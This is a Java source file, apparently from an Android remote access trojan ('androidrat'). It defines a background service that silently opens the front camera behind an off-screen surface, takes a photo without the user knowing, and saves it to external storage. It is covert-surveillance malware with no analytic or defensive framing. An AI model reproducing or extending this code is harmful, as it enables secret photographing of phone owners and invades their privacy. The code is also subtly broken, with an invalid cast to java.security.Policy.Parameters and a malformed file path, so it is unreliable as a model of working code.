package com.ot.androidrat;

import android.app.Service;
import android.content.Intent;
import android.hardware.Camera;
import android.os.Environment;
import android.os.IBinder;
import android.os.StrictMode;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

import androidx.annotation.Nullable;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.Policy;
import java.text.SimpleDateFormat;
import java.util.Calendar;

public class CapturePhoto extends Service {

    private SurfaceHolder sHolder;
    private Camera mCamera;
    private Policy.Parameters parameters;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d("CAM", "start");

        if (android.os.Build.VERSION.SDK_INT > 9) {
            StrictMode.ThreadPolicy policy =
                    new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);}
        Thread myThread = null;

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if(android.hardware.Camera.getNumberOfCameras() >= 2){
            mCamera = android.hardware.Camera.open(android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT);
        }
        if(Camera.getNumberOfCameras() < 2){
            mCamera = Camera.open();
        }
        SurfaceView sv = new SurfaceView(getApplicationContext());
        try {
            mCamera.setPreviewDisplay(sv.getHolder());
            parameters = (Policy.Parameters) mCamera.getParameters();
            mCamera.setParameters((Camera.Parameters) parameters);
            mCamera.startPreview();

            mCamera.takePicture(null, null, mCall);
        } catch (IOException e) {
            e.printStackTrace();
        }

        sHolder = sv.getHolder();
        sHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
        return super.onStartCommand(intent, flags, startId);
    }

    Camera.PictureCallback mCall = new Camera.PictureCallback() {
        @Override
        public void onPictureTaken(byte[] bytes, Camera camera) {
            FileOutputStream outStream = null;
            try{
                File sd = new File(Environment.getExternalStorageDirectory(), "A");
                if(!sd.exists()) {
                    sd.mkdirs();
                    Log.i("FO", "folder" + Environment.getExternalStorageDirectory());
                }

                Calendar cal = Calendar.getInstance();
                SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss");
                String tar = (sdf.format(cal.getTime()));

                outStream = new FileOutputStream(sd+tar+".jpg");
                outStream.write(bytes);  outStream.close();

                Log.i("CAM", bytes.length + " byte written to:"+sd+tar+".jpg");
                camkapa(sHolder);


            } catch (FileNotFoundException e){
                Log.d("CAM", e.getMessage());
            } catch (IOException e){
                Log.d("CAM", e.getMessage());
            }
        }
    };


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public void camkapa(SurfaceHolder sHolder) {
        if (null == mCamera)
            return;
        mCamera.stopPreview();
        mCamera.release();
        mCamera = null;
        Log.i("CAM", " closed");
    }
}
